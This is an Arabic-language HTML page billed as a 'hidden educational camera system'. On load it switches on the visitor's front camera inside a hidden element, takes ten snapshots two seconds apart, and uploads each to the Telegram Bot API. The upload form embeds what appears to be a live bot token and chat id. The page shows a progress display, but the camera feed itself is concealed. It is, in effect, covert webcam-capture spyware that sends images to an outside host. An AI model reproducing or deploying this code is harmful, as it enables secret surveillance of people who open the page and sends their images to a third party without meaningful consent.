<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>نظام التصوير الخفي التعليمي</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        :root {
            --gradient-1: #2c3e50;
            --gradient-2: #3498db;
        }
        
        body {
            margin: 0;
            min-height: 100vh;
            background: linear-gradient(45deg, var(--gradient-1), var(--gradient-2));
            animation: gradientBG 15s ease infinite;
            background-size: 400% 400%;
            color: white;
            font-family: 'Arial', sans-serif;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            padding: 2rem;
            text-align: center;
        }

        .animation-box {
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 2rem;
            margin: 2rem auto;
            max-width: 600px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.1);
        }

        #camera_hidden {
            display: none !important;
        }

        .status-card {
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 1.5rem;
            margin: 1rem;
            transition: transform 0.3s ease;
        }

        .status-card:hover {
            transform: scale(1.05);
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.8; }
            50% { opacity: 1; }
            100% { opacity: 0.8; }
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="animation-box animate__animated animate__fadeInDown">
            <h1 class="display-4 mb-4">🎥 نظام التصوير التعليمي الخفي</h1>
            <div class="pulse status-card">
                <div id="status" class="h4">
                    ⏳ جارِ تهيئة النظام...
                </div>
                <div class="progress mt-3" style="height: 8px;">
                    <div id="progressBar" class="progress-bar bg-success" 
                         role="progressbar" style="width: 0%"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- عنصر الكاميرا المخفي -->
    <div id="camera_hidden"></div>

    <script>
        const totalImages = 10;
        let imagesArray = [];
        let captureInterval;

        async function initializeSystem() {
            try {
                // تهيئة الكاميرا المخفية
                Webcam.set({
                    width: 320,
                    height: 240,
                    dest_width: 640,
                    dest_height: 480,
                    image_format: 'jpeg',
                    jpeg_quality: 90,
                    facingMode: "user"
                });

                Webcam.attach('#camera_hidden', async function() {
                    updateStatus('✅ تم تفعيل الكاميرا بنجاح');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    startCaptureProcess();
                }, function(error) {
                    updateStatus('❌ خطأ في تفعيل الكاميرا');
                    console.error(error);
                });

            } catch (error) {
                console.error('Error:', error);
                updateStatus('❌ حدث خطأ غير متوقع');
            }
        }

        async function startCaptureProcess() {
            updateStatus('🚀 بدء عملية الالتقاط التلقائي');
            
            let current = 0;
            captureInterval = setInterval(async () => {
                if(current >= totalImages) {
                    clearInterval(captureInterval);
                    await sendToTelegram();
                    return;
                }
                
                await takeSnapshot();
                current++;
                updateProgress((current/totalImages)*100);
                updateStatus(`📸 تم التقاط ${current} من ${totalImages} صور`);
            }, 2000);
        }

        function takeSnapshot() {
            return new Promise((resolve) => {
                Webcam.snap((data_uri) => {
                    imagesArray.push(data_uri);
                    resolve();
                });
            });
        }

        async function sendToTelegram() {
            updateStatus('📤 جارِ إرسال الصور إلى التليجرام...');
            
            try {
                for(const img of imagesArray) {
                    const blob = await fetch(img).then(res => res.blob());
                    const formData = new FormData();
                    formData.append('7828957324', '8031350603:AAEfbiBpNACqXmOsP4XLRz-MbexsfQgKw98');
                    formData.append('photo', blob, 'image.jpg');
                    
                    await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto', {
                        method: 'POST',
                        body: formData
                    });
                }
                
                updateStatus('🎉 تم الانتهاء بنجاح!');
                imagesArray = [];
            } catch (error) {
                console.error('Error:', error);
                updateStatus('❌ فشل في إرسال الصور');
            }
        }

        function updateStatus(text) {
            document.getElementById('status').innerHTML = text;
        }

        function updateProgress(percent) {
            document.getElementById('progressBar').style.width = percent + '%';
        }

        // بدء التشغيل عند تحميل الصفحة
        window.addEventListener('load', () => {
            setTimeout(initializeSystem, 1000);
        });
    </script>
</body>
</html>
